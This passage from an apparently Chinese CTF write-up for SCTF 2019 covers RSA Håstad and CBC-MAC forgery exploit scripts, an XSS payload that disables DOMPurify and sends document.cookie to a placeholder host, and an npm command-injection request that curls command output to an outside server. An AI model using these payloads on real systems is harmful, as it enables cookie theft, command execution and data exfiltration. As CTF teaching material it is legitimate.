class="title">hastads</span><span class="params">(cArray,nArray,e=<span class="number">3</span>)</span>:</span></span><br><span class="line">&gt;     <span class="string">"""</span></span><br><span class="line"><span class="string">&gt;     Performs Hastads attack on raw RSA with no padding.</span></span><br><span class="line"><span class="string">&gt;     cArray = Ciphertext Array</span></span><br><span class="line"><span class="string">&gt;     nArray = Modulus Array</span></span><br><span class="line"><span class="string">&gt;     e = public exponent</span></span><br><span class="line"><span class="string">&gt;     """</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     <span class="keyword">if</span>(len(cArray)==len(nArray)==e):</span><br><span class="line">&gt;         <span class="keyword">for</span> i <span class="keyword">in</span> range(e):</span><br><span class="line">&gt;             cArray[i] = Integer(cArray[i])</span><br><span class="line">&gt;             nArray[i] = Integer(nArray[i])</span><br><span class="line">&gt;         M = crt(cArray,nArray)</span><br><span class="line">&gt;         <span class="keyword">return</span>(Integer(M).nth_root(e,truncate_mode=<span class="number">1</span>))</span><br><span class="line">&gt;     <span class="keyword">else</span>:</span><br><span class="line">&gt;         print(<span class="string">"CiphertextArray, ModulusArray, need to be of the same length, and the same size as the public exponent"</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">linearPaddingHastads</span><span class="params">(cArray,nArray,aArray,bArray,e=<span class="number">3</span>,eps=<span class="number">1</span>/<span class="number">8</span>)</span>:</span></span><br><span class="line">&gt;     <span class="string">"""</span></span><br><span class="line"><span class="string">&gt;     Performs Hastads attack on raw RSA with no padding.</span></span><br><span class="line"><span class="string">&gt;     This is for RSA encryptions of the form: cArray[i] = pow(aArray[i]*msg + bArray[i],e,nArray[i])</span></span><br><span class="line"><span class="string">&gt;     Where they are all encryptions of the same message.</span></span><br><span class="line"><span class="string">&gt;     cArray = Ciphertext Array</span></span><br><span class="line"><span class="string">&gt;     nArray = Modulus Array</span></span><br><span class="line"><span class="string">&gt;     aArray = Array of 'slopes' for the linear padding</span></span><br><span class="line"><span class="string">&gt;     bArray = Array of 'y-intercepts' for the linear padding</span></span><br><span class="line"><span class="string">&gt;     e = public exponent</span></span><br><span class="line"><span class="string">&gt;     """</span></span><br><span class="line">&gt;     <span class="keyword">if</span>(len(cArray) == len(nArray) == len(aArray) == len(bArray) == e):</span><br><span class="line">&gt;         <span class="keyword">for</span> i <span class="keyword">in</span> range(e):</span><br><span class="line">&gt;             cArray[i] = Integer(cArray[i])</span><br><span class="line">&gt;             nArray[i] = Integer(nArray[i])</span><br><span class="line">&gt;             aArray[i] = Integer(aArray[i])</span><br><span class="line">&gt;             bArray[i] = Integer(bArray[i])</span><br><span class="line">&gt;         TArray = [<span class="number">-1</span>]*e</span><br><span class="line">&gt;         <span class="keyword">for</span> i <span class="keyword">in</span> range(e):</span><br><span class="line">&gt;             arrayToCRT = [<span class="number">0</span>]*e</span><br><span class="line">&gt;             arrayToCRT[i] = <span class="number">1</span></span><br><span class="line">&gt;             TArray[i] = crt(arrayToCRT,nArray)</span><br><span class="line">&gt;         P.&lt;x&gt; = PolynomialRing(Zmod(prod(nArray)))</span><br><span class="line">&gt;         gArray = [<span class="number">-1</span>]*e</span><br><span class="line">&gt;         <span class="keyword">for</span> i <span class="keyword">in</span> range(e):</span><br><span class="line">&gt;             gArray[i] = TArray[i]*(pow(aArray[i]*x + bArray[i],e) - cArray[i])</span><br><span class="line">&gt;         g = sum(gArray)</span><br><span class="line">&gt;         g = g.monic()</span><br><span class="line">&gt;         <span class="comment"># Use Sage's inbuilt coppersmith method</span></span><br><span class="line">&gt;         roots = g.small_roots(epsilon=eps)</span><br><span class="line">&gt;         <span class="keyword">if</span>(len(roots)== <span class="number">0</span>):</span><br><span class="line">&gt;             print(<span class="string">"No Solutions found"</span>)</span><br><span class="line">&gt;             <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&gt;         <span class="keyword">return</span> roots[<span class="number">0</span>]</span><br><span class="line">&gt; </span><br><span class="line">&gt;     <span class="keyword">else</span>:</span><br><span class="line">&gt;         print(<span class="string">"CiphertextArray, ModulusArray, and the linear padding arrays need to be of the same length,"</span> +</span><br><span class="line">&gt;          <span class="string">"and the same size as the public exponent"</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">LinearPadding</span><span class="params">()</span>:</span></span><br><span class="line">&gt;     <span class="keyword">import</span> random</span><br><span class="line">&gt;     <span class="keyword">import</span> binascii</span><br><span class="line">&gt; </span><br><span class="line">&gt;     e = <span class="number">3</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     nArr = [</span><br><span class="line">&gt;         <span class="number">0x81e620887a13849d094251e5db9b9160d299d2233244876344c0b454c99f7baf9322aa90b371f59a8ed673f666137df1f1e92d86e7b036479a2519827a81c7648543e16d4d0a334d0aa1124ad4c794298c3a227abfe1d44470ad4649609630450cb83f42f68ff2c445aaf546483b7a2b0a6e5877634ace5e640f8d8cbdc6a379</span>,</span><br><span class="line">&gt;         <span class="number">0x6c7c7935c58a586cf45e2e62ee51f6619ae2f6a7cef3865ed40a0d62ec31ba612e81045bcc6e50aa41d225b0f92b0d4a40051e2cf857ba61e91619e8fb3e2691d276c1abb5231c8012deb449e85752d2a02119bb186da6f7d41d704261284b395eec17ed4a2b07d1b97e34db8164e3093dd6cffbb0119ef8b3e9e960b0d96d05</span>,</span><br><span class="line">&gt;         <span class="number">0x5e67f4953462f66d217e4bf80fd4f591cbe22a8a3eac42f681aea880f0f90e4a34aca250b01754dd49d3b7512011609f757cbaf8ae7c97d5894fb92fb36595aff4a1303d01e5c707284bbfdc20b8378e046650675353e471853fa294f779df7b1b3f7cbe1748c2109d22cea682b01cb2c7719df03783e66cc3e44889a002c517</span>]</span><br><span class="line">&gt;     cArr = [</span><br><span class="line">&gt;         <span class="number">0x3512b763bab0b45b2c6941cccd550c8b2628cea0f162dc3902951e48115d58d16ea25075da6331617e7a4ac6062190f8ce91c65c91cff57a845a21d2ebd792b46bdcb666bc4aeab2232f990956084003b652664444ba0255dbab16620b2b232a1a4e6ec04e24249ff7ba33c70cb98c50d1f46bed076c53e2c95d0ec7dee5ad2f</span>,</span><br><span class="line">&gt;         <span class="number">0x36bfe6fba6f34b93a0d2d44c890dfe44afc715a586bc1a44aa184571bb88a238187024b36b22a1f52a64f553fb52cf7ce193937e047307dd62e4c980601a3d20b1fbfe69888992726b11bf20330e48e4a64c6d4825d1c6d058d745f5a709c2ab5ac86da1feacf13e9de2237426b70a17a56d201b4743c68b70fdd4c7ce5eaa3</span>,</span><br><span class="line">&gt;         <span class="number">0x4961ba65469dfc17e663af04dfb8eeee16c61df4f85971495d0c7e7061040602638963651791cfad28992312309c3179da27babf2a80fe41c062b21aa922da53bd793c614a0974ec5e5e18f9696df875e98aceef17d476d7615ea304e7e9869696711016151666f6b58f31241c590b3b313009434b444bcb7694bb8309d89475</span>]</span><br><span class="line">&gt;     aArr = [</span><br><span class="line">&gt;         <span class="number">0xd0f458bc246d88f38e78076b36ad58981928594035b9e428401dc3ccf049a8012926dffb5be9fa225e8e128370581acc79ee24fa259d4ea895ce61d3d607ed2b</span>,</span><br><span class="line">&gt;         <span class="number">0xfbedf9c34170262e2ed0eee7512e935715400a8ce541285c98e5269d2cdf4dc1aa81e117bf5d62a3310064376e8c3d5d5c4fa67e5a434ad93e5875eaa7be9545</span>,</span><br><span class="line">&gt;         <span class="number">0xa2995200a4f252d7ba9959a3b7d51c4b138f3823869f71573f4ab61c581ce8879d40396a33ddc32a93fd100a1029dba53e41a0acbe9e023a0bf51c6e4ddc911d</span>]</span><br><span class="line">&gt;     bArr = [</span><br><span class="line">&gt;         <span class="number">0xc2a6d47dc16824c86e92a9e88a931d215846052fe6787c11d0fcd9f4dde28f510707c33948290f69644a7fa64075d85e7761cfff3c627ee5156a03bd9f241c51</span>,</span><br><span class="line">&gt;         <span class="number">0xc2343fdbb6a351b387174db494e03d0879bea084e65b16f3f0ad106472bd3974813aec28a01fcceeae00db6d38b6c32bb6ce900dff236ae9c5814ad089591115</span>,</span><br><span class="line">&gt;         <span class="number">0xc4a2fb937c7441be58bfcb06208e0987423ab577041d0accf1f446545b9ebb7e4874fc56597ab1b842bb50e364a62f07a0afe7d6eff7a805361f8d3a12e79d65</span>]</span><br><span class="line">&gt;     randUpperBound = pow(<span class="number">2</span>,<span class="number">500</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt;     msg = linearPaddingHastads(cArr,nArr,aArr,bArr,e=e,eps=<span class="number">1</span>/<span class="number">8</span>)</span><br><span class="line">&gt;     msg = hex(int(msg))[<span class="number">2</span>:]</span><br><span class="line">&gt;     <span class="keyword">if</span>(msg[<span class="number">-1</span>]==<span class="string">'L'</span>):</span><br><span class="line">&gt;         msg = msg[:<span class="number">-1</span>]</span><br><span class="line">&gt;     <span class="keyword">if</span>(len(msg)%<span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">&gt;         msg = <span class="string">'0'</span> + msg</span><br><span class="line">&gt;     print(msg)</span><br><span class="line">&gt;     print(binascii.unhexlify(msg))</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     LinearPadding()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>2.exp.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt; HOST = <span class="string">"47.240.41.112"</span></span><br><span class="line">&gt; PORT = <span class="number">54321</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">&gt; <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(msg)</span>:</span></span><br><span class="line">&gt;     pad_length = <span class="number">16</span> - len(msg) % <span class="number">16</span></span><br><span class="line">&gt;     <span class="keyword">return</span> msg + chr(pad_length) * pad_length</span><br><span class="line">&gt; </span><br><span class="line">&gt; r = remote(HOST, PORT) </span><br><span class="line">&gt; ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">&gt; rl = <span class="keyword">lambda</span>  : r.recvline()</span><br><span class="line">&gt; sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment"># Give a large number bigger than n to break proof_of_work</span></span><br><span class="line">&gt; ru(<span class="string">'&#123;65537, '</span>)</span><br><span class="line">&gt; n = ru(<span class="string">'L&#125;'</span>).strip(<span class="string">'L&#125;'</span>)</span><br><span class="line">&gt; n = int(n[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">&gt; ru(<span class="string">'Give me something you want to encrypt:'</span>)</span><br><span class="line">&gt; sl(str(n**<span class="number">2</span>))</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment"># pad the message and target message we got in the first step</span></span><br><span class="line">&gt; msg = pad(<span class="string">"I will send you the ticket tomorrow afternoon"</span>)</span><br><span class="line">&gt; target_msg = pad(<span class="string">"I will send you the ticket tomorrow morning"</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; ru(<span class="string">'message'</span>)</span><br><span class="line">&gt; sl(<span class="string">'1'</span>)</span><br><span class="line">&gt; ru(<span class="string">'this:'</span>)</span><br><span class="line">&gt; message = ((ru(<span class="string">'\n'</span>).strip(<span class="string">' '</span>)).strip(<span class="string">'\n'</span>)).decode(<span class="string">'hex'</span>)</span><br><span class="line">&gt; ru(<span class="string">'message'</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment"># message xor enc_message = middle_key_stream, middle_key_stream xor target_message = enc_target_message, so enc_target_message = xor(message,enc_message,target_message)</span></span><br><span class="line">&gt; enc_target_message = strxor(strxor(target_msg,message),msg).encode(<span class="string">'hex'</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment"># choice 2 and send enc_target_message to get flag</span></span><br><span class="line">&gt; sl(<span class="string">'2'</span>)</span><br><span class="line">&gt; ru(<span class="string">'now:'</span>)</span><br><span class="line">&gt; sl(enc_target_message)</span><br><span class="line">&gt; flag = ru(<span class="string">'&#125;'</span>)</span><br><span class="line">&gt; <span class="keyword">print</span> <span class="string">"[+]FLAG IS: "</span>+flag</span><br><span class="line">&gt; r.close()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h2><span id="warmup">warmup</span></h2><blockquote><p>就是看函数unpad</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">unpad</span><span class="params">(self, msg)</span>:</span></span><br><span class="line">&gt;     <span class="keyword">return</span> msg[:-ord(msg[<span class="number">-1</span>])]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>msg[-1]可以自己设置，也就是说。要满足：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; msg = self.unpad(msg)</span><br><span class="line">&gt;             <span class="keyword">if</span> msg == <span class="string">'please send me your flag'</span>:</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>不一定要msg是<code>'please send me your flag'+'\x08'*8</code></p><p>后面还可以加一个16字节的，最后伪造成这样</p><p><code>'please send me your flag'+'A'*23+'\x18'</code>这个也能满足：</p><p>然后就要把那些A换成一些其它的值，使得能通过这个条件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> self.code(msg) == code:</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>个code函数就是每16位异或在一起，最后再进行一次确定性的加密。</p><p>已知的nc会给一个（明文，mac）对。记作(plaintext1,mac1)。</p><p>然后伪造一个(plaintext2,mac2)。让mac2=mac1，再让plaintext2每16位异或在一起的值和plaintext1每16位异或在一起的值相同就可以了。</p><p>回到这里<code>'please send me your flag'+'A'*23+'\x18'</code></p><p>我们能控制最后一组16位中的前15个字符和倒数第二组15位的最后一个字符。</p><p>异或一下就可以知道那些'A'替换成什么了。然后发过去行了。</p><p>exp.py <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; #!/usr/bin/python</span><br><span class="line">&gt; # -*- coding: utf-8 -*-</span><br><span class="line">&gt; </span><br><span class="line">&gt; from Crypto.Cipher import AES</span><br><span class="line">&gt; from Crypto.Util.strxor import strxor</span><br><span class="line">&gt; from Crypto.Random import get_random_bytes</span><br><span class="line">&gt; from FLAG import flag</span><br><span class="line">&gt; </span><br><span class="line">&gt; def pad(msg):</span><br><span class="line">&gt;     pad_length = 16 - len(msg) % 16</span><br><span class="line">&gt;     return msg + chr(pad_length) * pad_length</span><br><span class="line">&gt; </span><br><span class="line">&gt; iv = b&apos;1&apos;*16</span><br><span class="line">&gt; </span><br><span class="line">&gt; message = b&apos;see you at three o\&apos;clock tomorrow&apos;</span><br><span class="line">&gt; message = iv+pad(message)</span><br><span class="line">&gt; res1 = bytes([0])*16</span><br><span class="line">&gt; for i in range(len(message)/16):</span><br><span class="line">&gt;     res1 = bytesxor(message[i*16:(i+1)*16], res1)</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; message2 = &apos;please send me your flag&apos; # len=24</span><br><span class="line">&gt; message2 = iv+message2+7*b&apos;\x00&apos;+b&apos;\x18&apos;</span><br><span class="line">&gt; res2 = bytes([0])*16</span><br><span class="line">&gt; for i in range(len(message)/16):</span><br><span class="line">&gt;     res2 = bytesxor(message[i*16:(i+1)*16], res2)</span><br><span class="line">&gt; </span><br><span class="line">&gt; sig = bytesxor(res1,res2)</span><br><span class="line">&gt; sig1 = sig[:15]</span><br><span class="line">&gt; sig2 = sig[15:]</span><br><span class="line">&gt; </span><br><span class="line">&gt; final = iv+message2+7*b&apos;\x00&apos;+sig2+sig1+b&apos;\x18&apos;</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p><code>sctf{y0u_4r3_7h3_4p3x_ch4mp10n}</code></p></blockquote><h1><span id="web">Web</span></h1><h2><span id="math-is-fun1">math-is-fun1</span></h2><blockquote><p>题目给了个在线编辑器</p><p>http://47.110.128.101/challenge?name=Challenger</p><p>可以提交一个url到服务器，结合hint确定是要xss了</p><p>http://47.110.128.101/send_message.html</p><p>启用了Dompurify，且配置文件http://47.110.128.101/config 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; (&#123;&quot;SAFE_FOR_JQUERY&quot;:true,&quot;ALLOWED_TAGS&quot;:[&quot;style&quot;,&quot;img&quot;,&quot;video&quot;],&quot;ALLOWE</span><br><span class="line">&gt; D_ATTR&quot;:[&quot;style&quot;,&quot;src&quot;,&quot;href&quot;],&quot;FORBID_TAGS&quot;:[&quot;base&quot;,&quot;svg&quot;,&quot;link&quot;,&quot;iframe&quot;,&quot;frame&quot;,&quot;embed&quot;]&#125;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>分析了页面里的js代码，渲染流程如下：</p><p>1.服务器将name参数拼接到一个config类型的script标签中</p><p>2.读取上面那个标签的内容并解析然后给window[]赋值 （这里可以变量覆盖）</p><p>3.将config[name]拼接到textarea中</p><p>4.读取location.search中的text，URLdecode后覆盖textarea</p><p>5.监听textarea变化后会执行如下事件</p><p>6.读取textarea的内容</p><p>7.Dompurify过滤 （上面发的先知链接已经被修复）</p><p>8.markdown渲染 （不知道用的啥库）</p><p>9.latex渲染 （用的mathjax2.7.5不存在已知xss）</p><p>10.插入页面</p><p>猜测是要覆盖DOMPurify的某些变量，能够使其失效，翻看Dompurify的源码</p><p>https://github.com/cure53/DOMPurify/blob/c57dd450d8613fddfda67ad182526f371b4638fd/src/purify.js:966</p><figure><img src="https://p0.ssl.qhimg.com/t0173dfe5ddb8a0d720.png" alt><figcaption>image.png</figcaption></figure><p>当DOMPurify.isSupported为false，则能够绕过过滤</p><p>于是构造</p><p><code>name=a;alert(1);%0aDOMPurify[%27isSupported%27]%3dfalse&amp;text=&lt;script&gt;alert(1)</code></p><p>把DOMPurify.isSupported设置为false，text参数的值就能直接插入页面中，造成xss</p><p>（这里不知道为啥直接<code>text=&lt;script&gt;alert(1)</code>就绕过csp弹窗了，可能是非预期</p><figure><img src="https://p0.ssl.qhimg.com/t014615ccb9c6131bbc.png" alt><figcaption>image.png</figcaption></figure><p>最后payload： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; name=a;alert(1);%0aDOMPurify[%27isSupported%27]%3dfalse&amp;text=&lt;script&gt;window.location.href%3d&quot;http://xxxx.xxxx/?a%3d&quot;%2bescape(document.cookie)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>两题都可以用这个paylaod打</p><figure><img src="https://p1.ssl.qhimg.com/t01db9bdb799ab6f604.png" alt><figcaption>image.png</figcaption></figure></blockquote><h2><span id="math-is-fun2">math-is-fun2</span></h2><blockquote><p>题解同上，</p><p>payload： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; name=a;alert(1);%0aDOMPurify[%27isSupported%27]%3dfalse&amp;text=&lt;script&gt;window.location.href%3d&quot;http://xxxx.xxxx/?a%3d&quot;%2bescape(document.cookie)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h2><span id="easy-web">easy-web</span></h2><blockquote><p>用chrome可以看到webpack里有web接口相关信息</p><figure><img src="https://p1.ssl.qhimg.com/t018ba4533e3d929c7e.png" alt><figcaption>image.png</figcaption></figure><p>/upload接口可以打包nodejs库到zip并返回一个url给你下载</p><p>测试发现npm参数可以命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; POST /upload HTTP/1.1</span><br><span class="line">&gt; Host: sctf2019.l0ca1.xyz</span><br><span class="line">&gt; Connection: close</span><br><span class="line">&gt; Content-Length: 173</span><br><span class="line">&gt; Accept: application/json, text/plain, */*</span><br><span class="line">&gt; Origin: https://sctf2019.l0ca1.xyz</span><br><span class="line">&gt; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">&gt; Content-Type: application/json;charset=UTF-8</span><br><span class="line">&gt; Referer: https://sctf2019.l0ca1.xyz/</span><br><span class="line">&gt; Accept-Encoding: gzip, deflate</span><br><span class="line">&gt; Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">&gt; </span><br><span class="line">&gt; &#123;&quot;key&quot;:&quot;abcdefghiklmn123&quot;,&quot;npm&quot;:[&quot;;curl http://xxx:8088/ -X POST -d \&quot;`ls -al`\&quot;&quot;]&#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>找了半天，服务器里啥也没有，把源码扒下来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">&gt; const koa = require(&quot;koa&quot;);</span><br><span class="line">&gt; const AWS = require(&quot;aws-sdk&quot;);</span><br><span class="line">&gt; const bodyparser = require(&apos;koa-bodyparser&apos;);</span><br><span class="line">&gt; const Router = require(&apos;koa-router&apos;);</span><br><span class="line">&gt; const async = require(&quot;async&quot;);</span><br><span class="line">&gt; const archiver = require(&apos;archiver&apos;);</span><br><span class="line">&gt; const fs = require(&quot;fs&quot;);</span><br><span class="line">&gt; const cp = require(&quot;child_process&quot;);</span><br><span class="line">&gt; const mount = require(&quot;koa-mount&quot;);</span><br><span class="line">&gt; const cfg = &#123;</span><br><span class="line">&gt;     &quot;Bucket&quot;:&quot;static.l0ca1.xyz&quot;,</span><br><span class="line">&gt;     &quot;host&quot;:&quot;static.l0ca1.xyz&quot;,</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; function getRandomStr(len) &#123;</span><br><span class="line">&gt;     var text = &quot;&quot;;</span><br><span class="line">&gt;     var possible = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;</span><br><span class="line">&gt;     for (var i = 0; i &lt; len; i++)</span><br><span class="line">&gt;         text += possible.charAt(Math.floor(Math.random() * possible.length));</span><br><span class="line">&gt;     return text;</span><br><span class="line">&gt; &#125;;</span><br><span class="line">&gt; function zip(archive, output, nodeModules) &#123;</span><br><span class="line">&gt;     const field_name = getRandomStr(20);</span><br><span class="line">&gt;     fs.mkdirSync(`/tmp/$&#123;field_name&#125;`);</span><br><span class="line">&gt;     archive.pipe(output);</span><br><span class="line">&gt;     return new Promise((res, rej) =&gt; &#123;</span><br><span class="line">&gt;         async.mapLimit(nodeModules, 10, (i, c) =&gt; &#123;</span><br><span class="line">&gt;             process.chdir(`/tmp/$&#123;field_name&#125;`);</span><br><span class="line">&gt;             console.log(`npm --userconfig=&apos;/tmp&apos; --cache=&apos;/tmp&apos; install $&#123;i&#125;`);</span><br><span class="line">&gt;             cp.exec(`npm --userconfig=&apos;/tmp&apos; --cache=&apos;/tmp&apos; install $&#123;i&#125;`, (error, stdout, stderr) =&gt; &#123;</span><br><span class="line">&gt;                 if (error) &#123;</span><br><span class="line">&gt;                     c(null, error);</span><br><span class="line">&gt;                 &#125; else &#123;</span><br><span class="line">&gt;                     c(null, stdout);</span><br><span class="line">&gt;                 &#125;</span><br><span class="line">&gt;             &#125;);</span><br><span class="line">&gt;         &#125;, (error, results) =&gt; &#123;</span><br><span class="line">&gt;             archive.directory(`/tmp/$&#123;field_name&#125;/`, false);</span><br><span class="line">&gt;             archive.finalize();</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;         output.on(&apos;close&apos;, function () &#123;</span><br><span class="line">&gt;             cp.exec(`rm -rf /tmp/$&#123;field_name&#125;`, () =&gt; &#123;</span><br><span class="line">&gt;                 res(&quot;&quot;);</span><br><span class="line">&gt;             &#125;);</span><br><span class="line">&gt;         &#125;);</span><br><span class="line">&gt;         archive.on(&quot;error&quot;, (e) 